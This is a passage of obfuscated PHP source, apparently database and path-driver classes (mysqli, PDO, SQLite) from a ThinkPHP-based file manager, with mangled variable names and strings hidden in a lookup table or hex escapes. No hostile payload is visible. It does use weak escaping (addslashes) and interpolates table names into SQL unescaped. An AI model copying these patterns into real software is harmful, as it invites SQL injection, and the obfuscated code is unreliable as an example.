$this->getAll(); } } public function execute($Æ¸ôŒÊŒ) { $ê¿¬Ôºü =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ¸ôŒÊŒ; if ($this->queryID) { $this->free(); } think_action_status($ê¿¬Ôºü[25], 1); think_status($ê¿¬Ôºü[24]); $®ù©„ò‹ = $this->_linkID->query($Æ¸ôŒÊŒ); $this->debug(); if (!1 === $®ù©„ò‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Î€¯™ê = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Î€¯™ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $àœàñãÁ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$àœàñãÁ) { $this->error(); return !1; } } return !0; } private function getAll() { $¸İŸªÀÓ = array(); if ($this->numRows > 0) { for ($¦Úöœ®¬ = 0; $¦Úöœ®¬ < $this->numRows; $¦Úöœ®¬++) { $¸İŸªÀÓ[$¦Úöœ®¬] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¸İŸªÀÓ; } public function getFields($·Ï³îó) { $î„Õö¹ =& $_SERVER[åÄ¼Ùßš]; $«¯øÆÒ = $this->query($î„Õö¹[1002] . $this->parseKey($·Ï³îó)); $ßş‘Æ«Ä = array(); if ($«¯øÆÒ) { foreach ($«¯øÆÒ as $‰ˆ‘¶• => $½úéº¦´) { $ßş‘Æ«Ä[$½úéº¦´[$î„Õö¹[31]]] = array($î„Õö¹[32] => $½úéº¦´[$î„Õö¹[31]], $î„Õö¹[33] => $½úéº¦´[$î„Õö¹[34]], $î„Õö¹[35] => (bool) ($½úéº¦´[$î„Õö¹[36]] === $î„Õö¹[12]), $î„Õö¹[37] => $½úéº¦´[$î„Õö¹[38]], $î„Õö¹[39] => strtolower($½úéº¦´[$î„Õö¹[40]]) == $î„Õö¹[41], $î„Õö¹[42] => strtolower($½úéº¦´[$î„Õö¹[43]]) == $î„Õö¹[44]); } } return $ßş‘Æ«Ä; } public function getTables($Âæ×Â ì = '') { $ˆ’’â¡ê =& $_SERVER[åÄ¼Ùßš]; $«ÓòÛÒ¯ = !empty($Âæ×Â ì) ? $ˆ’’â¡ê[1004] . $Âæ×Â ì . $ˆ’’â¡ê[1005] : $ˆ’’â¡ê[1006]; $å‡«´à = $this->query($«ÓòÛÒ¯); $¾î¨Á¤» = array(); if ($å‡«´à) { foreach ($å‡«´à as $¦Áıçï† => $ü—È¶ ¤) { $¾î¨Á¤»[$¦Áıçï†] = current($ü—È¶ ¤); } } return $¾î¨Á¤»; } public function replace($‡×ÇË¢, $ŞáŞ®·î = array()) { $¤Ñ»ä‹ê =& $_SERVER[åÄ¼Ùßš]; foreach ($‡×ÇË¢ as $¹”¶ßæ => $Á¶öæ¯à) { $ˆŸõá¶ù = $this->parseValue($Á¶öæ¯à); if (is_scalar($ˆŸõá¶ù)) { $¯±Ü©Ê[] = $ˆŸõá¶ù; $ÌŠÂäğ«[] = $this->parseKey($¹”¶ßæ); } } $ÄæËŠ•Â = $¤Ñ»ä‹ê[1007] . $this->parseTable($ŞáŞ®·î[$¤Ñ»ä‹ê[359]]) . $¤Ñ»ä‹ê[1008] . implode($¤Ñ»ä‹ê[50], $ÌŠÂäğ«) . $¤Ñ»ä‹ê[1009] . implode($¤Ñ»ä‹ê[50], $¯±Ü©Ê) . $¤Ñ»ä‹ê[1010]; return $this->execute($ÄæËŠ•Â); } public function insertAll($õ§¼ß‰, $¹œŒ…Š = array(), $éùï’¹Õ = false) { $‘¶–ØÒö =& $_SERVER[åÄ¼Ùßš]; if (!is_array($õ§¼ß‰[0])) { return !1; } $™²Ó˜É† = array_keys($õ§¼ß‰[0]); $á©‰Û›ô = array(); foreach ($õ§¼ß‰ as $Ğú£Í¨ö) { $´Ó½ÇÏÚ = array(); foreach ($Ğú£Í¨ö as $Ó…Ã‘Õ => $ÈÔªÑøÃ) { $ÈÔªÑøÃ = $this->parseValue($ÈÔªÑøÃ); if (is_scalar($ÈÔªÑøÃ)) { $´Ó½ÇÏÚ[] = $ÈÔªÑøÃ; } } $á©‰Û›ô[] = $‘¶–ØÒö[340] . implode($‘¶–ØÒö[50], $´Ó½ÇÏÚ) . $‘¶–ØÒö[1010]; } array_walk($™²Ó˜É†, array($this, $‘¶–ØÒö[1011])); $”Çúœ‹ö = $éùï’¹Õ ? $‘¶–ØÒö[1012] : $‘¶–ØÒö[1013]; $”Çúœ‹ö = $‘¶–ØÒö[1013]; $ı¹í¦µ = $”Çúœ‹ö . $‘¶–ØÒö[1014] . $this->parseTable($¹œŒ…Š[$‘¶–ØÒö[359]]) . $‘¶–ØÒö[1008] . implode($‘¶–ØÒö[50], $™²Ó˜É†) . $‘¶–ØÒö[1015] . implode($‘¶–ØÒö[50], $á©‰Û›ô); if ($éùï’¹Õ) { $Å˜ïÉ™¢ = array(); foreach ($™²Ó˜É† as $Ó…Ã‘Õ) { if ($Ó…Ã‘Õ == $‘¶–ØÒö[234] || $Ó…Ã‘Õ == $‘¶–ØÒö[1016]) { continue; } $Å˜ïÉ™¢[] = $Ó…Ã‘Õ . $‘¶–ØÒö[1017] . $Ó…Ã‘Õ . $‘¶–ØÒö[1010]; } $ı¹í¦µ .= $‘¶–ØÒö[1018] . implode($‘¶–ØÒö[50], $Å˜ïÉ™¢); } return $this->execute($ı¹í¦µ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $á“Â˜— =& $_SERVER[åÄ¼Ùßš]; $this->error = $this->_linkID->errno . $á“Â˜—[4] . $this->_linkID->error; if ($á“Â˜—[12] != $this->queryStr) { $this->error .= LNG($á“Â˜—[48]) . $this->queryStr; } think_trace($this->error, $á“Â˜—[12], $á“Â˜—[49]); return $this->error; } public function escapeString($„»™ğÊŸ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($„»™ğÊŸ); } else { return addslashes($„»™ğÊŸ); } } public function parseKey(&$ÀåÃšã©, $ˆ†¶®–ş = true) { $Û ÅÕ×  =& $_SERVER[åÄ¼Ùßš]; if ($ˆ†¶®–ş) { $ÀåÃšã© = $this->parseKeyCheck($ÀåÃšã©); } if ($ÀåÃšã© != $Û ÅÕ× [223] && !preg_match($Û ÅÕ× [1019], $ÀåÃšã©)) { $ÀåÃšã© = $Û ÅÕ× [473] . trim($ÀåÃšã©, $Û ÅÕ× [473]) . $Û ÅÕ× [473]; } return $ÀåÃšã©; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÓçŒÛÚÑ = '') { $ô×´Ğš =& $_SERVER[åÄ¼Ùßš]; if (!class_exists($ô×´Ğš[1022])) { think_exception(think_lang($ô×´Ğš[14]) . $ô×´Ğš[1023]); } if (!empty($ÓçŒÛÚÑ)) { $this->config = $ÓçŒÛÚÑ; if (empty($this->config[$ô×´Ğš[17]])) { $this->config[$ô×´Ğš[17]] = array(); } } } public function connect($á×Ñ›¡ = '', $‘ÂÓòä½ = 0) { $¥˜ó¥‹Ö =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->linkID[$‘ÂÓòä½])) { if (empty($á×Ñ›¡)) { $á×Ñ›¡ = $this->config; } $ËŒÊ‡©õ = !empty($á×Ñ›¡[$¥˜ó¥‹Ö[17]][$¥˜ó¥‹Ö[18]]) ? $á×Ñ›¡[$¥˜ó¥‹Ö[17]][$¥˜ó¥‹Ö[18]] : $this->pconnect; if ($ËŒÊ‡©õ) { $á×Ñ›¡[$¥˜ó¥‹Ö[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‘ÂÓòä½] = new PDO($á×Ñ›¡[$¥˜ó¥‹Ö[1024]], $á×Ñ›¡[$¥˜ó¥‹Ö[993]], $á×Ñ›¡[$¥˜ó¥‹Ö[994]], $á×Ñ›¡[$¥˜ó¥‹Ö[17]]); } catch (PDOException $å¬Ñèêä) { think_exception($å¬Ñèêä->getMessage()); } $this->dbType = $this->_getDsnType($á×Ñ›¡[$¥˜ó¥‹Ö[1024]]); if (in_array($this->dbType, array($¥˜ó¥‹Ö[1025], $¥˜ó¥‹Ö[1026], $¥˜ó¥‹Ö[1027], $¥˜ó¥‹Ö[1028]))) { think_exception($¥˜ó¥‹Ö[1029] . $this->dbType . $¥˜ó¥‹Ö[1030] . $this->dbType . $¥˜ó¥‹Ö[1031]); } if (!$this->linkID[$‘ÂÓòä½]) { think_exception($¥˜ó¥‹Ö[1032]); } try { $this->linkID[$‘ÂÓòä½]->exec($¥˜ó¥‹Ö[1033] . think_config($¥˜ó¥‹Ö[996])); } catch (Exception $å¬Ñèêä) { } $this->connected = !0; if (1 != think_config($¥˜ó¥‹Ö[22])) { unset($this->config); } } return $this->linkID[$‘ÂÓòä½]; } public function free() { $this->PDOStatement = null; } public function query($°¢•‹±µ, $èù­ÀéÓ = array()) { $¸Ï±“Ô„ =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $°¢•‹±µ; if (!empty($èù­ÀéÓ)) { $this->queryStr .= $¸Ï±“Ô„[1034] . print_r($èù­ÀéÓ, !0) . $¸Ï±“Ô„[1035]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¸Ï±“Ô„[23], 1); think_status($¸Ï±“Ô„[24]); $this->PDOStatement = $this->_linkID->prepare($°¢•‹±µ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ŠÂßŸö = $this->PDOStatement->execute($èù­ÀéÓ); $this->debug(); if (!1 === $ŠÂßŸö) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ ò½îñ…, $÷Â”ƒøÏ = array()) { $×Œ’Ë¤ƒ =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ ò½îñ…; if (!empty($÷Â”ƒøÏ)) { $this->queryStr .= $×Œ’Ë¤ƒ[1034] . print_r($÷Â”ƒøÏ, !0) . $×Œ’Ë¤ƒ[1035]; } $úÉãÊªÃ = !1; if ($this->dbType == $×Œ’Ë¤ƒ[1028]) { if (preg_match($×Œ’Ë¤ƒ[1036], $this->queryStr, $Šó™æÏ÷)) { $this->table = think_config($×Œ’Ë¤ƒ[1037]) . str_ireplace(think_config($×Œ’Ë¤ƒ[1038]), $×Œ’Ë¤ƒ[464], $Šó™æÏ÷[2]); $úÉãÊªÃ = (bool) $this->query($×Œ’Ë¤ƒ[1039] . strtoupper($this->table) . $×Œ’Ë¤ƒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($×Œ’Ë¤ƒ[25], 1); think_status($×Œ’Ë¤ƒ[24]); $this->PDOStatement = $this->_linkID->prepare($ ò½îñ…); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ä·å›Â = $this->PDOStatement->execute($÷Â”ƒøÏ); $this->debug(); if (!1 === $ä·å›Â) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($úÉãÊªÃ || preg_match($×Œ’Ë¤ƒ[1040], $ ò½îñ…)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚À®Ìîİ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‚À®Ìîİ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $şÎæñÅï = $this->_linkID->rollback(); $this->transTimes = 0; if (!$şÎæñÅï) { $this->error(); return !1; } } return !0; } private function getAll() { $†‘±§ÊÎ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($†‘±§ÊÎ); return $†‘±§ÊÎ; } public function getFields($‡¹üš°Ù) { $ĞÆÖî—Æ =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (think_config($ĞÆÖî—Æ[1041])) { $ü˜œµ = str_replace($ĞÆÖî—Æ[1042], $‡¹üš°Ù, think_config($ĞÆÖî—Æ[1041])); } else { switch ($this->dbType) { case $ĞÆÖî—Æ[1025]: case $ĞÆÖî—Æ[1043]: $ü˜œµ = "\x53\105\114\x45\103\124\40\40\40\x63\x6f\x6c\165\x6d\156\137\156\x61\x6d\x65\x20\x61\x73\x20\47\116\x61\155\x65\x27\x2c\40\40\x20\x64\141\x74\141\137\164\x79\x70\x65\x20\141\163\x20\x27\x54\171\x70\145\x27\54\40\40\40\143\157\x6c\165\155\x6e\x5f\144\x65\x66\141\165\x6c\x74\x20\141\x73\40\47\104\x65\x66\141\165\x6c\x74\x27\54\x20\x20\x20\151\x73\x5f\156\x75\154\x6c\x61\x62\154\x65\40\x61\x73\x20\47\x4e\165\x6c\154\x27\xa\x9\11\x46\x52\x4f\115\11\x69\156\x66\x6f\x72\155\x61\x74\151\x6f\x6e\x5f\x73\143\150\x65\155\x61\56\164\141\x62\154\145\x73\40\x41\123\40\x74\xa\x9\11\x4a\x4f\x49\116\11\x69\156\x66\157\162\x6d\141\164\x69\157\156\137\163\x63\x68\x65\x6d\x61\x2e\143\x6f\x6c\165\155\x6e\x73\x20\x41\x53\40\143\12\11\x9\117\x4e\40\40\164\x2e\164\x61\142\x6c\x65\137\x63\141\164\x61\x6c\157\x67\40\x3d\x20\x63\56\x74\141\142\154\145\137\143\141\164\141\154\157\147\xa\11\x9\101\116\x44\x20\164\56\164\141\x62\x6c\x65\137\163\143\x68\x65\155\x61\x20\75\40\x63\x2e\x74\x61\142\154\145\x5f\163\x63\x68\145\155\x61\xa\x9\x9\101\116\x44\40\164\x2e\x74\x61\142\x6c\145\137\156\141\x6d\145\40\x3d\40\x63\x2e\164\x61\x62\154\x65\137\x6e\x61\x6d\x65\12\x9\11\x57\110\105\122\x45\x20\x20\40\164\56\164\x61\142\154\x65\x5f\x6e\x61\x6d\x65\x20\x3d\40\47{$‡¹üš°Ù}\47"; break; case $ĞÆÖî—Æ[1044]: $ü˜œµ = $ĞÆÖî—Æ[1045] . $‡¹üš°Ù . $ĞÆÖî—Æ[1046]; break; case $ĞÆÖî—Æ[1026]: case $ĞÆÖî—Æ[1028]: $ü˜œµ = $ĞÆÖî—Æ[1047] . $ĞÆÖî—Æ[1048] . $ĞÆÖî—Æ[1049] . strtoupper($‡¹üš°Ù) . $ĞÆÖî—Æ[1050] . strtoupper($‡¹üš°Ù) . $ĞÆÖî—Æ[1051]; break; case $ĞÆÖî—Æ[1052]: $ü˜œµ = $ĞÆÖî—Æ[1053] . $‡¹üš°Ù . $ĞÆÖî—Æ[1054]; break; case $ĞÆÖî—Æ[1027]: break; case $ĞÆÖî—Æ[1055]: default: $ü˜œµ = $ĞÆÖî—Æ[1056] . ($this->dbType == $ĞÆÖî—Æ[1055] ? "\140{$‡¹üš°Ù}\140" : $‡¹üš°Ù); } } $œ¹«¶½¨ = $this->query($ü˜œµ); $ äÈ’Ğ¾ = array(); if ($œ¹«¶½¨) { foreach ($œ¹«¶½¨ as $İ€¹åÛè => $‚ğÜ±º±) { $‚ğÜ±º± = array_change_key_case($‚ğÜ±º±); $‚ğÜ±º±[$ĞÆÖî—Æ[32]] = isset($‚ğÜ±º±[$ĞÆÖî—Æ[32]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[32]] : $ĞÆÖî—Æ[464]; $‚ğÜ±º±[$ĞÆÖî—Æ[33]] = isset($‚ğÜ±º±[$ĞÆÖî—Æ[33]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[33]] : $ĞÆÖî—Æ[464]; $ĞĞ­±º = isset($‚ğÜ±º±[$ĞÆÖî—Æ[353]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[353]] : $‚ğÜ±º±[$ĞÆÖî—Æ[32]]; $ äÈ’Ğ¾[$ĞĞ­±º] = array($ĞÆÖî—Æ[32] => $ĞĞ­±º, $ĞÆÖî—Æ[33] => $‚ğÜ±º±[$ĞÆÖî—Æ[33]], $ĞÆÖî—Æ[35] => (bool) (isset($‚ğÜ±º±[$ĞÆÖî—Æ[106]]) && $‚ğÜ±º±[$ĞÆÖî—Æ[106]] === $ĞÆÖî—Æ[12] || isset($‚ğÜ±º±[$ĞÆÖî—Æ[35]]) && $‚ğÜ±º±[$ĞÆÖî—Æ[35]] === $ĞÆÖî—Æ[12]), $ĞÆÖî—Æ[37] => isset($‚ğÜ±º±[$ĞÆÖî—Æ[37]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[37]] : (isset($‚ğÜ±º±[$ĞÆÖî—Æ[56]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[56]] : $ĞÆÖî—Æ[464]), $ĞÆÖî—Æ[39] => isset($‚ğÜ±º±[$ĞÆÖî—Æ[97]]) ? strtolower($‚ğÜ±º±[$ĞÆÖî—Æ[97]]) == $ĞÆÖî—Æ[41] : (isset($‚ğÜ±º±[$ĞÆÖî—Æ[57]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[57]] : !1), $ĞÆÖî—Æ[42] => isset($‚ğÜ±º±[$ĞÆÖî—Æ[1057]]) ? strtolower($‚ğÜ±º±[$ĞÆÖî—Æ[1057]]) == $ĞÆÖî—Æ[44] : (isset($‚ğÜ±º±[$ĞÆÖî—Æ[97]]) ? $‚ğÜ±º±[$ĞÆÖî—Æ[97]] : !1)); } } return $ äÈ’Ğ¾; } public function getTables($­ğé™‰ú = '') { $­Ä‘ëŸí =& $_SERVER[åÄ¼Ùßš]; if (think_config($­Ä‘ëŸí[1058])) { $™„…ñ‘˜ = str_replace($­Ä‘ëŸí[1059], $­ğé™‰ú, think_config($­Ä‘ëŸí[1058])); } else { switch ($this->dbType) { case $­Ä‘ëŸí[1026]: case $­Ä‘ëŸí[1028]: $™„…ñ‘˜ = $­Ä‘ëŸí[1060]; break; case $­Ä‘ëŸí[1025]: case $­Ä‘ëŸí[1043]: $™„…ñ‘˜ = $­Ä‘ëŸí[1061]; break; case $­Ä‘ëŸí[1052]: $™„…ñ‘˜ = $­Ä‘ëŸí[1062]; break; case $­Ä‘ëŸí[1027]: think_exception(think_lang($­Ä‘ëŸí[1063]) . $­Ä‘ëŸí[1064]); break; case $­Ä‘ëŸí[1044]: $™„…ñ‘˜ = $­Ä‘ëŸí[45] . $­Ä‘ëŸí[46] . $­Ä‘ëŸí[47]; break; case $­Ä‘ëŸí[1055]: default: if (!empty($­ğé™‰ú)) { $™„…ñ‘˜ = $­Ä‘ëŸí[1004] . $­ğé™‰ú . $­Ä‘ëŸí[1005]; } else { $™„…ñ‘˜ = $­Ä‘ëŸí[1006]; } } } $½§´óÅÚ = $this->query($™„…ñ‘˜); $²¬Èêø» = array(); foreach ($½§´óÅÚ as $ïŞ–ºİ => $õê£´Ñ) { $²¬Èêø»[$ïŞ–ºİ] = current($õê£´Ñ); } return $²¬Èêø»; } protected function parseLimit($ƒôîíÆş) { $ÑïşÌ« =& $_SERVER[åÄ¼Ùßš]; $¥Ù×¨Âª = $ÑïşÌ«[12]; if (!empty($ƒôîíÆş)) { switch ($this->dbType) { case $ÑïşÌ«[1052]: case $ÑïşÌ«[1044]: $ƒôîíÆş = explode($ÑïşÌ«[50], $ƒôîíÆş); if (count($ƒôîíÆş) > 1) { $¥Ù×¨Âª .= $ÑïşÌ«[51] . $ƒôîíÆş[1] . $ÑïşÌ«[52] . $ƒôîíÆş[0] . $ÑïşÌ«[53]; } else { $¥Ù×¨Âª .= $ÑïşÌ«[51] . $ƒôîíÆş[0] . $ÑïşÌ«[53]; } break; case $ÑïşÌ«[1025]: case $ÑïşÌ«[1043]: break; case $ÑïşÌ«[1027]: break; case $ÑïşÌ«[1026]: case $ÑïşÌ«[1028]: break; case $ÑïşÌ«[1055]: default: $¥Ù×¨Âª .= $ÑïşÌ«[51] . $ƒôîíÆş . $ÑïşÌ«[53]; } } return $¥Ù×¨Âª; } public function parseKey(&$Ã¾ÕŒ˜, $şşà¯ãÍ = true) { $¢éı¯«­ =& $_SERVER[åÄ¼Ùßš]; if ($şşà¯ãÍ) { $Ã¾ÕŒ˜ = $this->parseKeyCheck($Ã¾ÕŒ˜); } if ($this->dbType == $¢éı¯«­[1055]) { if ($Ã¾ÕŒ˜ != $¢éı¯«­[223] && !preg_match($¢éı¯«­[1019], $Ã¾ÕŒ˜)) { $Ã¾ÕŒ˜ = $¢éı¯«­[473] . trim($Ã¾ÕŒ˜, $¢éı¯«­[473]) . $¢éı¯«­[473]; } return $Ã¾ÕŒ˜; } else { return parent::parseKey($Ã¾ÕŒ˜, $şşà¯ãÍ); } } public function close() { $this->_linkID = null; } public function error() { $ï¥²‰ö =& $_SERVER[åÄ¼Ùßš]; if ($this->PDOStatement) { $ƒŞ¼î‡¶ = $this->PDOStatement->errorInfo(); $this->error = $ƒŞ¼î‡¶[1] . $ï¥²‰ö[4] . $ƒŞ¼î‡¶[2]; } else { $this->error = $ï¥²‰ö[12]; } if ($ï¥²‰ö[12] != $this->queryStr) { $this->error .= LNG($ï¥²‰ö[48]) . $this->queryStr; } think_trace($this->error, $ï¥²‰ö[12], $ï¥²‰ö[49]); return $this->error; } public function escapeString($–É†£ÍÊ) { $çŒƒÌ‚œ =& $_SERVER[åÄ¼Ùßš]; switch ($this->dbType) { case $çŒƒÌ‚œ[1052]: case $çŒƒÌ‚œ[1025]: case $çŒƒÌ‚œ[1043]: case $çŒƒÌ‚œ[1055]: return addslashes($–É†£ÍÊ); case $çŒƒÌ‚œ[1027]: case $çŒƒÌ‚œ[1044]: case $çŒƒÌ‚œ[1026]: case $çŒƒÌ‚œ[1028]: return str_ireplace($çŒƒÌ‚œ[58], $çŒƒÌ‚œ[59], $–É†£ÍÊ); } } protected function parseValue($«ÒŸşº´) { $¸Ğ×± =& $_SERVER[åÄ¼Ùßš]; if (is_string($«ÒŸşº´)) { $—Á»Çğ = strpos($«ÒŸşº´, $¸Ğ×±[4]) === 0 && in_array($«ÒŸşº´, array_keys($this->bind)); $«ÒŸşº´ = $—Á»Çğ ? $this->escapeString($«ÒŸşº´) : $¸Ğ×±[1065] . $this->escapeString($«ÒŸşº´) . $¸Ğ×±[1065]; } elseif (isset($«ÒŸşº´[0]) && is_string($«ÒŸşº´[0]) && strtolower($«ÒŸşº´[0]) == $¸Ğ×±[374]) { $«ÒŸşº´ = $this->escapeString($«ÒŸşº´[1]); } elseif (is_array($«ÒŸşº´)) { $«ÒŸşº´ = array_map(array($this, $¸Ğ×±[1066]), $«ÒŸşº´); } elseif (is_bool($«ÒŸşº´)) { $«ÒŸşº´ = $«ÒŸşº´ ? $¸Ğ×±[91] : $¸Ğ×±[231]; } elseif (is_null($«ÒŸşº´)) { $«ÒŸşº´ = $¸Ğ×±[106]; } return $«ÒŸşº´; } public function getLastInsertId() { $•˜ ©äµ =& $_SERVER[åÄ¼Ùßš]; switch ($this->dbType) { case $•˜ ©äµ[1052]: case $•˜ ©äµ[1044]: case $•˜ ©äµ[1025]: case $•˜ ©äµ[1043]: case $•˜ ©äµ[1027]: case $•˜ ©äµ[1055]: return $this->_linkID->lastInsertId(); case $•˜ ©äµ[1026]: case $•˜ ©äµ[1028]: $ÅØã¼ç® = $this->table; $ò¼Â­‹Ÿ = $this->query("\123\x45\x4c\x45\103\124\x20{$ÅØã¼ç®}\56\x63\165\x72\162\166\x61\154\40\143\x75\x72\162\x76\x61\x6c\40\106\122\117\x4d\40\x64\165\x61\x6c"); return $ò¼Â­‹Ÿ ? $ò¼Â­‹Ÿ[0][$•˜ ©äµ[1067]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($–Äó¢È) { $ãñ¹ûñÔ =& $_SERVER[åÄ¼Ùßš]; if (!CacheLock::fileLock($ãñ¹ûñÔ[13])) { return !1; } $ÜëÒá‡Ğ = parent::query($–Äó¢È); CacheLock::fileUnLock($ãñ¹ûñÔ[13]); return $ÜëÒá‡Ğ; } public function execute($Ü•Òïã) { $óÓ¯àé =& $_SERVER[åÄ¼Ùßš]; if (!CacheLock::fileLock($óÓ¯àé[13])) { return !1; } $ÑÕ“‘İ“ = parent::execute($Ü•Òïã); CacheLock::fileUnLock($óÓ¯àé[13]); return $ÑÕ“‘İ“; } } goto eíÇ¸ƒ…¬; cò‘Ü”ñî: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ƒªçÛŞ =& $_SERVER[åÄ¼Ùßš]; $this->objectDriver = array($ƒªçÛŞ[60], $ƒªçÛŞ[61], $ƒªçÛŞ[62], $ƒªçÛŞ[63], $ƒªçÛŞ[64], $ƒªçÛŞ[65], $ƒªçÛŞ[66], $ƒªçÛŞ[67], $ƒªçÛŞ[68], $ƒªçÛŞ[69], $ƒªçÛŞ[70], $ƒªçÛŞ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ä¥ô„‡ ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ä¥ô„‡ , $_SERVER[åÄ¼Ùßš][8]); } return $Ä¥ô„‡ ; } public function iconvApp($õìì±Áô) { return $õìì±Áô; } public function iconvSystem($ŞüŠÑí¶) { return $ŞüŠÑí¶; } public function iconvTo($ßÉåøùÂ, $ß×îıãô, $ãµ¨ı¾ª) { $¿ÂÕã½ =& $_SERVER[åÄ¼Ùßš]; if (!$ßÉåøùÂ || !function_exists($¿ÂÕã½[72])) { return $ßÉåøùÂ; } static $Ñ±î‹Í¥ = array(); $Àğäì³Ä = $ß×îıãô . $¿ÂÕã½[73] . $ãµ¨ı¾ª . $¿ÂÕã½[74] . $ßÉåøùÂ; if (isset($Ñ±î‹Í¥[$Àğäì³Ä])) { return $Ñ±î‹Í¥[$Àğäì³Ä]; } if (function_exists($¿ÂÕã½[75])) { $¸Ï÷€¡å = @mb_convert_encoding($ßÉåøùÂ, $ãµ¨ı¾ª, $ß×îıãô); } else { $¸Ï÷€¡å = @iconv($ß×îıãô, $ãµ¨ı¾ª, $ßÉåøùÂ); } $¸Ï÷€¡å = $¸Ï÷€¡å ? $¸Ï÷€¡å : $ßÉåøùÂ; if (strstr($¸Ï÷€¡å, $¿ÂÕã½[76])) { $¸Ï÷€¡å = str_replace($¿ÂÕã½[76], $¿ÂÕã½[11], $¸Ï÷€¡å); } $Ñ±î‹Í¥[$ß×îıãô . $¿ÂÕã½[73] . $ãµ¨ı¾ª . $¿ÂÕã½[74] . $ßÉåøùÂ] = $¸Ï÷€¡å; $Ñ±î‹Í¥[$ãµ¨ı¾ª . $¿ÂÕã½[73] . $ß×îıãô . $¿ÂÕã½[74] . $ßÉåøùÂ] = $ßÉåøùÂ; $Ñ±î‹Í¥[$ãµ¨ı¾ª . $¿ÂÕã½[73] . $ß×îıãô . $¿ÂÕã½[74] . $¸Ï÷€¡å] = $ßÉåøùÂ; $Ñ±î‹Í¥[$ß×îıãô . $¿ÂÕã½[73] . $ãµ¨ı¾ª . $¿ÂÕã½[74] . $¸Ï÷€¡å] = $¸Ï÷€¡å; return $¸Ï÷€¡å; } public function getPathInner($¹ˆŠË®ë) { $õÃ­ìĞä = IO::init($¹ˆŠË®ë); return $õÃ­ìĞä->path; } public function getPathOuter($ìÃ±ü) { $³ êÃ =& $_SERVER[åÄ¼Ùßš]; $¬›¥¢ãì = strlen(trim($this->pathBase, $³ êÃ[8])); $ìÃ±ü = substr(trim($ìÃ±ü, $³ êÃ[8]), $¬›¥¢ãì); return $this->pathDriver . $³ êÃ[8] . ltrim($ìÃ±ü, $³ êÃ[8]); } public function isParentOf($ºåÊ–À˜, $íîÔ«Æœ) { $•ËäéÕ® =& $_SERVER[åÄ¼Ùßš]; $ºåÊ–À˜ = rtrim(strtolower($ºåÊ–À˜), $•ËäéÕ®[8]) . $•ËäéÕ®[8]; $íîÔ«Æœ = rtrim(strtolower($íîÔ«Æœ), $•ËäéÕ®[8]) . $•ËäéÕ®[8]; $–õöìèŒ = strpos($íîÔ«Æœ, $ºåÊ–À˜) === 0; return $–õöìèŒ; } public function getType() { $ßÜíİÌú =& $_SERVER[åÄ¼Ùßš]; $œüø‚¤î = str_replace($ßÜíİÌú[77], $ßÜíİÌú[12], get_class($this)); return strtolower($œüø‚¤î); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÊºÌƒšı, $ßŸ“†Ü) { $äó–ò’ =& $_SERVER[åÄ¼Ùßš]; $æÑ€æ¢¦ = rtrim($ÊºÌƒšı, $äó–ò’[8]) . $äó–ò’[8] . $ßŸ“†Ü; $À÷ËÙÍÇ = $this->exist($æÑ€æ¢¦); return $À÷ËÙÍÇ ? $æÑ€æ¢¦ : !1; } public function setModifyTime($É¡š±öŞ, $×ô€èÈÃ = '') { } public function renameObject($ÔÒÖ¬ˆË, $µò×–Ñ) { $–×ã°Øù = $µò×–Ñ; $ÔÒÖ¬ˆË = $this->getPathOuter($ÔÒÖ¬ˆË); $µò×–Ñ = $this->pathFather($ÔÒÖ¬ˆË) . $µò×–Ñ; $Ö³üà¬ = IO::copy($ÔÒÖ¬ˆË, $this->pathFather($ÔÒÖ¬ˆË), REPEAT_RENAME_FOLDER, $–×ã°Øù); if ($Ö³üà¬) { IO::remove($ÔÒÖ¬ˆË); } return $Ö³üà¬ ? $µò×–Ñ : !1; } public function tempFile($¸îÆ÷´ = '', $Ğùñ¬éÏ = '') { if (!$¸îÆ÷´) { $¸îÆ÷´ = rand_string(15); } 